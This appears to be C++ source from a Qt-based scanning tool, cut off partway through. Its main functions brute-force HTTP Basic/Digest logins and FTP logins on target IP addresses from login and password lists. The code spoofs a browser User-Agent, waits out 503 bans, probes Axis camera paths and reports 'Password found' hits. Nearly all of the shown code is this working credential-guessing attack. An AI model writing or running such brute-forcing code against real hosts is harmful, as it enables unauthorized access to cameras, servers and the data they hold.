#pragma once
#include "STh.h"
#include <openssl/ssl.h>
#include <libssh/libssh.h>
#include <sstream>
#include <openssl/md5.h>
#pragma once


volatile bool BConnLocked = false;
void BConInc()
{
	while(BConnLocked == true) Sleep(6);

	BConnLocked = true;
	++BrutingThrds;
	BConnLocked = false;
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
	++BA;
};
void BConDec()
{
	while(BConnLocked == true) Sleep(8);

	BConnLocked = true;
	if(BrutingThrds > 0) --BrutingThrds;
	BConnLocked = false;
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};
bool SSHConnLocked = false;
void SSHConInc()
{
	while(SSHConnLocked == true) Sleep(6);

	SSHConnLocked = true;
	++BrutingThrds;
	SSHConnLocked = false;
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};
void SSHConDec()
{
	while(SSHConnLocked == true) Sleep(8);

	SSHConnLocked = true;
	if(BrutingThrds > 0) --BrutingThrds;
	SSHConnLocked = false;
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};

bool debugWriteWait = false;
void _DebugWriteHTMLToFile(char *request, char *buff)
{
	while(debugWriteWait) Sleep(50);
	debugWriteWait = true;
	FILE *df = fopen("./debugData.txt", "a");

	if(df != NULL)
	{
		fputs(request, df);
		fputs("==========================\n", df);
		fputs(buff, df);
		fputs("\n==========================\n==========================\n\n", df);
		fclose(df);
	}
	else
	{
		stt->doEmitionRedFoundData("[DEBUG] Cannot open debugData.txt");
	};
	debugWriteWait = false;
};
unsigned char tl(unsigned char d)
{
	if(d >= 192 && d <= 223)
	{
		unsigned char y = d + 32;
		return y;
	}
	else 
	{
		return tolower(d);
	};
};
int recvWT( 
	int Socket, 
	char *Buffer, 
	int Len, 
	long Timeout, 
	int *bTimedOut 
	){ 
		fd_set ReadSet; 
		int n;
		struct timeval Time; 

		FD_ZERO(&ReadSet); 
		FD_SET(Socket,&ReadSet); 
		Time.tv_sec = Timeout; 
		Time.tv_usec = 0; 
		*bTimedOut = FALSE; 
		n = select(Socket+1,&ReadSet,NULL,NULL,&Time); 
		if (n > 0) { /* got some data */ 
			return recv(Socket,Buffer,Len,0); 
		} 
		if (n == 0) { /* timeout */ 
			*bTimedOut = TRUE; 
		} 
		return(n) ; /* trouble */ 
}
string toLowerStr(const char *str)
{
	int tsz = strlen(str);
	if(tsz == 1)
	{
		if(str[0] == 10) return "[No data!]";
		else return str;
	}
	else if(tsz > 1)
	{
		char * strr = new char[tsz+1];
		ZeroMemory(strr, tsz);

		for (int i = 0; i < tsz; i++) 
		{
			strr[i] = tl(str[i]);
		};

		memset(strr + tsz, '\0', 1);

		string tstr = strr;
		delete []strr;
		return tstr;
	};
	return "";
};
SSL_CTX* InitCTX(void)
{   
	const SSL_METHOD *method;
	SSL_CTX *ctx;

	OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
	SSL_load_error_strings();   /* Bring in and register error messages */
	method = SSLv3_client_method();  /* Create new client-method instance */
	ctx = SSL_CTX_new(method);   /* Create new context */
	SSL_CTX_set_timeout(ctx, gTimeOut);
	if ( ctx == NULL )
	{
		stt->doEmitionRedFoundData("SSL error (InitCTX).");
		abort();
	}
	return ctx;
}
int OpenConnection(const char *hostname, int port)
{   int sd;
struct hostent *host;
struct sockaddr_in addr;
if(strlen(hostname) == 0) 
{
	if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
	return -1;
};
if(port < 0 || port > 65535) 
{
	if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
	return -1;
};

if ( (host = gethostbyname(hostname)) == NULL )
{
	++offlines;
	if(mode != 1) 
	{
		char temp[256] = {0};
		strcpy(temp, "[Error - Bad Address (");

		strcat(temp, hostname);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());
		strcat(temp, "):");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, "]");

#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[SSL error]: " + QString(temp));
#pragma endregion

	};
	if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
	return -1;
};
sd = socket(PF_INET, SOCK_STREAM, 0);
ZeroMemory(&addr, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = *(long*)(host->h_addr);
if ( connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{

#pragma region QTGUI_Area
	stt->doEmitionRedFoundData("[SSL error]: Cannot open connection to " + QString(hostname) + ":" + QString::number(port));
#pragma endregion
	closesocket(sd);
	return -1;
}
return sd;
}

char *_baSSLWorker(char *ip, char *request)
{
	int bytes = 0;

	SSL_library_init();
	SSL_CTX *ctx = InitCTX();
	SOCKET sock = OpenConnection(ip, 443);
	if(sock >= 0)
	{
		SSL *ssl = SSL_new(ctx);      /* create new SSL connection state */
		SSL_set_fd(ssl, sock);    /* attach the socket descriptor */

		if(SSL_connect(ssl))
		{
			SSL_write(ssl, request, strlen(request));
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

			int x = 256;
			char recvBuff[1024] = {0};

			ZeroMemory(recvBuff, sizeof(recvBuff));
			x = SSL_read(ssl, recvBuff, sizeof(recvBuff));

			Activity += x;

			SSL_free(ssl);
			closesocket(sock);         /* close socket */
			SSL_CTX_free(ctx);        /* release context */
			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));
			std::string res2 = "";

			if(HTMLDebugMode) _DebugWriteHTMLToFile(request, recvBuff);
			return recvBuff;
		}
		else
		{
			closesocket(sock);         /* close socket */
			SSL_CTX_free(ctx);        /* release context */
			return "";
		};
	};
};
char *_getAttributeValue(char *str, char *val)
{
	char res[1024] = {0};
	char *ptrStart = NULL; 
	char *ptrS1End = NULL;
	char *ptrS2End = NULL;

	ptrStart = strstri(str, val);
	if(ptrStart != NULL)
	{
		ptrS1End = FindFirstOcc(ptrStart, "\"");
		if(ptrS1End != NULL)
		{
			ptrS2End = FindFirstOcc(ptrS1End + 1, "\"");
			if(ptrS2End != NULL)
			{
				int sz = ptrS2End - ptrS1End - 1;

				if(sz != 0 && sz < 1024) strncpy(res, ptrS1End + 1, sz);
				else return "";

				return res;
			}
			else
			{
				stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: " + QString(val));
				return "";				
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: " + QString(val));
			return "";				
		};
	}
	else
	{
		stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: " + QString(val));
		return "";
	};
};
void print_md5_sum(unsigned char* md, char* md5) 
{
	char temp[8] = {0};
	for(int i = 0; i < MD5_DIGEST_LENGTH; ++i) 
	{
		ZeroMemory(temp, 8);
		sprintf(temp, "%02x", md[i]);

		if(i != 0)
		{
			strcat(md5, temp);
		}
		else
		{
			strcpy(md5, temp);
		};
	};
};
char *_makeDigestResponse(char *login, char *realm, char *pass, char *path, char *nonce)
{
	unsigned char HA1[MD5_DIGEST_LENGTH];
	unsigned char HA2[MD5_DIGEST_LENGTH];
	char HA1Data[512] = {0};
	char HA2Data[512] = {0};

	strcpy(HA1Data, login);
	strcat(HA1Data, ":");
	strcat(HA1Data, realm);
	strcat(HA1Data, ":");
	strcat(HA1Data, pass);

	strcpy(HA2Data, "GET:");
	strcat(HA2Data, path);

	MD5((unsigned char*) HA1Data, strlen(HA1Data), HA1);
	MD5((unsigned char*) HA2Data, strlen(HA2Data), HA2);

	char responseData[512] = {0};
	char *HA1MD5 = new char[64];
	char *HA2MD5 = new char[64];
	ZeroMemory(HA1MD5, 64);
	ZeroMemory(HA2MD5, 64);

	print_md5_sum(HA1, HA1MD5);
	strcpy(responseData, HA1MD5);
	strcat(responseData, ":");
	strcat(responseData, nonce);
	strcat(responseData, "::auth:");
	print_md5_sum(HA2, HA2MD5);
	strcat(responseData, HA2MD5);
	delete []HA1MD5;
	delete []HA2MD5;

	unsigned char response[MD5_DIGEST_LENGTH];
	MD5((unsigned char*) responseData, strlen(responseData), response);
	char responseMD5[64] = {0};
	print_md5_sum(response, responseMD5);
	return (char*)responseMD5;
};
lopaStr _BABrut(char *ip, int port, char *pathT, char *method, char *data)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	char request[4096] = {0};
	char path[512] = {0};
	strncpy(path, pathT, 512);
	sockaddr_in sockAddr;
	SOCKET sock;
	int bTO;
	bool goon = false;
	char hMsg[1024] = {0};
	char hMsgR[512] = {0};

	strcpy(hMsg, "GET ");
	strcat(hMsg, path);
	strcat(hMsg, " HTTP/1.1\r\nHost: ");
	strcat(hMsg, ip);
	strcat(hMsg, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\n\r\n");

#pragma region VerifyBASSL
	if(port == 443)
	{
		strncpy(hMsg, _baSSLWorker(ip, hMsg), 1024);		
	}
#pragma endregion
	else
#pragma region VerifyBA
	{
		sockAddr.sin_family = AF_INET;
		sockAddr.sin_port = htons(port);
		HOSTENT *host;
#if defined(WIN32)
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
		else
		{
#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[BA] Bad address! [" + QString(ip) + "]");
#pragma endregion
		};
#else
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
		else
		{
#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[BA] Bad address! [" + QString(ip) + "]");
#pragma endregion
		};
#endif
		SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));


		send(sock, hMsg, strlen(hMsg), 0);
		if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hMsg));
		ZeroMemory(hMsg, sizeof(hMsg));
		int x = 1;
		int xx = 0;
		while(xx < 512)
		{
			x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 10, &bTO);
			if(x == 0) break;
			strcat(hMsg, hMsgR);
			xx += x;
			ZeroMemory(hMsgR, sizeof(hMsgR));
		};
		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(hMsg));
	};
#pragma endregion
	if(strlen(hMsg) == 0)
	{
		OnLiner = 0;

		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
	if(strstr(hMsg, "401 ") == NULL && strstr(hMsg, ".1 401") == NULL && strstr(hMsg, ".0 401") == NULL)
	{
		if(strstri(hMsg, "400 Bad") != NULL)
		{
			shutdown(sock, SD_BOTH);
			closesocket(sock);

			strcpy(lps.other, "[400 Bad Request]");
			OnLiner = 0;
			return lps;
		}
		else if(strstri(hMsg, "404 Not") != NULL || strstr(hMsg, "404 ") != NULL || strstr(hMsg, ".1 404") != NULL || strstr(hMsg, ".0 404") != NULL)
		{
			if(strstr(path, "/axis-cgi/com/ptz.cgi?") != NULL)
			{
				int sz = strlen("/view/viewer_index.shtml");
				strncpy(path, "/view/viewer_index.shtml", sz);
				memset(path + sz, 0, 1);
				goon = true;
			}
			else
			{
				shutdown(sock, SD_BOTH);
				closesocket(sock);

				strcpy(lps.other, QString("[404 Not Found (" + QString(path) + ")]").toLocal8Bit().data());
				OnLiner = 0;
				return lps;
			};
		};

		if(goon == false)
		{
			shutdown(sock, SD_BOTH);
			closesocket(sock);

			strcpy(lps.login, "NULL");
			strcpy(lps.pass, "NULL");
			OnLiner = 0;
			return lps;
		};
	};

	shutdown(sock, SD_BOTH);
	closesocket(sock);
#pragma endregion

	OnLiner = 1;
	char tPass[256] = {0};
	char curLogin[256] = {0};
	char curPass[256] = {0};
	int cCode;
	int cErrCode;
	int x = 1;
	int dataSz = 0;
	int maxSize = 1024;
	char recvBuff[4096] = {0};
	char recvBuff2[512] = {0};
	char pass[256] = {0};
	int WSAErr;

	char localBuff[4096] = {0};
	strcpy(localBuff, data);
	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;

			ZeroMemory(curLogin, sizeof(curLogin));
			ZeroMemory(curPass, sizeof(curPass));
			strcpy(curLogin, loginLst[i]);
			strcpy(curPass, passLst[j]);

			ZeroMemory(request, sizeof(request));
			ZeroMemory(tPass, sizeof(tPass));
			strncpy(tPass, curLogin, strlen(curLogin));
			strcat(tPass, ":");
			strncat(tPass, curPass, strlen(curPass));
			string encoded = base64_encode((const unsigned char *)tPass, strlen(tPass));
			strcpy(tPass, base64_decode(encoded).c_str());



			if(strcmp(method, "[DIGEST]") == 0)
			{
				char attribute[2048] = {0};
				strcpy(attribute, _getAttribute(localBuff, "WWW-Authenticate:"));
				char nonce[128] = {0};
				strcpy(nonce, _getAttributeValue(attribute, "nonce="));
				char realm[128] = {0};
				strcpy(realm, _getAttributeValue(attribute, "realm="));

				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");					
				strcat(request, curLogin);
				strcat(request, "\", realm=\"");
				strcat(request, realm);
				strcat(request, "\", nonce=\"");
				strcat(request, nonce);
				strcat(request, "\", uri=\"");
				strcat(request, path);
				strcat(request, "\", qop=auth, response=\"");
				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce));
				strcat(request, "\"\r\nConnection: close\r\nContent-length: 0\r\n\r\n");
			}
			else
			{
				if(strcmp(method, "[NORMAL]") != 0)	stt->doEmitionRedFoundData("[-] Unknown method IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + + "</a>");		
				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");					
				strcat(request, encoded.c_str());
				strcat(request, "\r\nConnection: close\r\nContent-length: 0\r\n\r\n");
			};

			if(BALogSwitched) stt->doEmitionBAData("Probing " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(tPass));


#pragma region BABSEQ-HTTPS
			if(port == 443)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				strncpy(recvBuff, _baSSLWorker(ip, request), sizeof(recvBuff));
			}
#pragma endregion
			else
#pragma region BABSEQ-HTTP
			{
				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
				cErrCode = WSAGetLastError();

				while(cErrCode == 10038)
				{
					shutdown(sock, SD_BOTH);
					closesocket(sock);
					sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
					cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
					cErrCode = WSAGetLastError();
					if(gDebugMode) stt->doEmitionDebugFoundData("[BA] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
				};
				if(cCode != SOCKET_ERROR) 
				{
					x = 1;
					Activity += strlen(request);

					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 	
					{
						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
						dataSz = 0;
						maxSize = 1024;
						ZeroMemory(recvBuff2, 512);
						ZeroMemory(recvBuff, sizeof(recvBuff));
						while (x > 0 && dataSz < 3584)				
						{
							ZeroMemory(recvBuff2, sizeof(recvBuff2));
							x = recvWT(sock, recvBuff2, sizeof(recvBuff2), gTimeOut + 5, &bTO);

							dataSz += x;
							Activity += x;
							if(x <= 0) break;

							strcat(recvBuff, recvBuff2);
						};
					}
					else
					{
						stt->doEmitionRedFoundData("[BA][CRITICAL] Send error! [" + QString(ip) + "]");

						shutdown(sock, SD_BOTH);
						closesocket(sock);
						OnLiner = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					}
				}
				else
				{
					int WSAErr = WSAGetLastError();
					if(WSAErr != 10060)
					{
						stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(WSAErr) + "]");
					};

					shutdown(sock, SD_BOTH);
					closesocket(sock);

					OnLiner = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};

				shutdown(sock, SD_BOTH);
				closesocket(sock);
			};
#pragma endregion

			if(globalScanFlag == false) break;
			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

			if(strlen(recvBuff) == 0)
			{
				OnLiner = 0;
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData("[BA] Empty reply. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
#pragma endregion
				strcpy(lps.login, "UNKNOWN");

				return lps;
			};
			if(strcmp(method, "[DIGEST]") == 0)
			{
				ZeroMemory(localBuff, sizeof(localBuff));
				strcpy(localBuff, recvBuff);
			};
			if((strstri(recvBuff, "http/1.1 404") != NULL || strstri(recvBuff, "http/1.0 404") != NULL
				) && strstri(recvBuff, "Authorization required") == NULL)

			{
				if(HTMLDebugMode) _DebugWriteHTMLToFile(request, recvBuff);

#pragma region QTGUI_Area
				stt->doEmitionRedFoundData("[-] 404 - Wrong path detected. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
#pragma endregion
			}
			else if(strstr(recvBuff, "503 Service Unavailable") != NULL ||
				strstr(recvBuff, "503 service unavailable") != NULL ||
				strstr(recvBuff, "http/1.1 503") != NULL ||
				strstr(recvBuff, "HTTP/1.1 503") != NULL ||
				strstr(recvBuff, "HTTP/1.0 503") != NULL
				)
			{
#pragma region QTGUI_Area
				stt->doEmition_BARedData("[-] 503 - Ban detected? Waiting 1 min (" + QString(ip) + ":" + QString::number(port) + ")");
#pragma endregion

				if(j > 0) --j;
				Sleep(60000);
			}
			else if(strstri(recvBuff, "Authentication required") != NULL
				|| strstri(recvBuff, "Authentication failed") != NULL
				|| strstri(recvBuff, "Authentication Required") != NULL
				|| strstri(recvBuff, "HTTP/1.1 401 ") != NULL
				|| strstri(recvBuff, "HTTP/1.0 401 ") != NULL
				|| strstri(recvBuff, "401 Unauthorized") != NULL
				|| strstri(recvBuff, "401 Authorization") != NULL)
			{
				/*dummy*/
			}
			else if( (strstri(recvBuff, "200 ok") != NULL 
				|| strstri(recvBuff, "HTTP/1.0 200") != NULL
				) && strstri(recvBuff, "Access forbidden") == NULL 
				&& strstri(recvBuff, "Authentication required") == NULL
				&& strstri(recvBuff, "Authentication failed") == NULL
				&& strstri(recvBuff, "Authentication Required") == NULL
				&& strstri(recvBuff, "HTTP/1.1 401 ") == NULL
				&& strstri(recvBuff, "HTTP/1.0 401 ") == NULL
				&& strstri(recvBuff, "401 Unauthorized") == NULL
				&& strstri(recvBuff, "401 Authorization") == NULL
				&& strlen(recvBuff) > 13
				) 
			{
				if(strstri(recvBuff, "meta http-equiv=\"refresh\"") != NULL) 
				{
					ZeroMemory(pass, sizeof(pass));
					strcpy(pass, ip);
					strcat(pass, " - Password found: ");
					strcat(pass, tPass);
					strcat(pass, " [FH]");
					OnLiner = 0;
					strcat(tPass, " [ FAKE HIT ]");

					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);

					return lps;
				};
				if(strstri(recvBuff, "window.location.href") != NULL)
				{
					ZeroMemory(pass, 256);
					strcpy(pass, ip);
					strcat(pass, "[Redirect in Basic Authorization detected. Check defaults manually (");
					strcat(pass, tPass);
					strcat(pass, ")]");
					OnLiner = 0;
					stt->doEmition_BAGreenData("[-] " + QString(pass));
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);

					return lps;
				};
				if(strstri(recvBuff, "Access is Denied") == NULL 
					&& strstri(recvBuff, "iisstart") == NULL 
					&& strstri(recvBuff, "Location:") == NULL
					&& strstri(recvBuff, "Access forbidden") == NULL
					&& strstri(recvBuff, "Authentication required") == NULL
					)
				{
					ZeroMemory(pass, 256);
					strcpy(pass, ip);
					strcat(pass, " - Password found: ");
					strcat(pass, tPass);
					OnLiner = 0;
					stt->doEmition_BAGreenData("[+] " + QString(pass));
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);

					return lps;
				};
			}
			else
			{
				ZeroMemory(pass, 256);
				strcpy(pass, ip);
				strcat(pass, " - Password found: ");
				strcat(pass, tPass);
				OnLiner = 0;
				char *pt1 = strstr(recvBuff, " ");
				if(pt1 != NULL)
				{
					char *pt2 = strstr(pt1 + 1, " ");
					if(pt2 != NULL)
					{
						int sz = pt2 - pt1 - 1;
						char tempHeaderCode[16] = {0};
						strncpy(tempHeaderCode, pt1 + 1, sz);
						stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
						strcpy(lps.login, curLogin);
						strcpy(lps.pass, curPass);

						return lps;
					}
					else
					{
						stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
						strcpy(lps.login, curLogin);
						strcpy(lps.pass, curPass);

						return lps;
					};
				}
				else
				{
					stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);

					return lps;
				};
			};
		};
	};
#pragma endregion
	OnLiner = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
}
lopaStr Connector::_BALobby(char *ip, int port, char *path, char *method, char *data)
{
	BConInc();
	lopaStr res = _BABrut(ip, port, path, method, data);
	BConDec();
	return res;
};

lopaStr Connector::_ftpBrute(char *ip, int port, PathStr *ps)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	char recvBuff[1024] = {0}, request[64] = {0};

	int connectionResult, closedSocket = 1, loginFailedFlag = 0; 

	SOCKET sockFTP;
	sockaddr_in sockAddr;  
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);

	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{	
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[CRITICAL] " + QString("Bad address! (") + QString(ip) + ")");
#pragma endregion
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[CRITICAL] Bad address! [" + QString(ip) + "]");
#pragma endregion
	};
#endif
	bool breakPassLoop = 0;
	for(int i = 0; i < MaxLogin; ++i)
	{
		if(globalScanFlag == false) break;
		if(strlen(loginLst[i]) <= 1) continue;
		for(int j = 0; j < MaxPass; ++j)
		{
			if(globalScanFlag == false) break;
			if(strlen(passLst[j]) <= 1) continue;
			if(closedSocket) 
			{
				closedSocket = 0;
				sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
				int cErrCode = WSAGetLastError();

				while(cErrCode == 10038)
				{
					shutdown(sockFTP, SD_BOTH);
					closesocket(sockFTP);
					sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
					connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
					cErrCode = WSAGetLastError();
					if(gDebugMode) stt->doEmitionDebugFoundData("[FTP] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
				};
				loginFailedFlag = 0;
			};

			OnLiner = 1;

			if(connectionResult != SOCKET_ERROR) 
			{
				int x = 0;
				int bTO;
				while (true)
				{
					if(globalScanFlag == false) break;
					ZeroMemory(recvBuff, sizeof(recvBuff));
					x = recvWT(sockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 5, &bTO);
					if(x == -1 || x == 0) break;
					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

					Activity += x;
					closedSocket = 0;
					if(strstr(recvBuff, "451 The parameter is incorrect.") != NULL)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						OnLiner = 0;
#pragma region QTGUI_Area
						stt->doEmition_BARedData("[*] Anonymous access detected - " + QString(ip));
#pragma endregion
						strcpy(lps.other, "Unknown protocol (451 Error)");
						return lps;
					};

					if(strstri(recvBuff, "only anonymous") != NULL)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						OnLiner = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[*] Anonymous access detected - " + QString(ip));
#pragma endregion
						strcpy(lps.login, "anonymous");
						strcpy(lps.pass, "1");
						return lps;
					};

					if(strstr(recvBuff, "550 No connections allowed") != NULL || strstr(recvBuff, "550 no connections allowed")
						|| strstr(recvBuff, "550-"))
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);

						OnLiner = 0;
						closedSocket = 1;

#pragma region QTGUI_Area
						stt->doEmition_BARedData("[-] 550 (No connections allowed) - Ban detected. Dropping " + QString(ip) + ":" + QString::number(port));
#pragma endregion

						strcpy(lps.login, "UNKNOWN");
						return lps;
					};

					if(strstr(recvBuff, "500 Sorry, no such command") != NULL || strstr(recvBuff, "no such command"))
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);

						OnLiner = 0;
						closedSocket = 1;
						strcpy(lps.other, "[500 Sorry, no such command]");
						return lps;
					};

					if((strstr(recvBuff, "500 ") != NULL || strstr(recvBuff, "500-") != NULL || strstr(recvBuff, "500 -") != NULL)
						&& strstr(recvBuff, "500 oops") == NULL && strstr(recvBuff, "500 OOPS") == NULL)
					{
						j = 0;
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if(strstr(recvBuff, "421 ") != NULL || strstr(recvBuff, "421-") != NULL || strstr(recvBuff, "421 -") != NULL)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if(strstri(recvBuff, "530 Sorry, no ANONYMOUS access allowed.") != NULL)
					{
						++i;
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if((strstr(recvBuff, "530 Sorry") != NULL) || (strstr(recvBuff, "530") != NULL && strstr(recvBuff, "maximum") != NULL)
						|| (strstr(recvBuff, "530") != NULL && strstr(recvBuff, "exceeded") != NULL) || strstr(recvBuff, "exceeded") != NULL
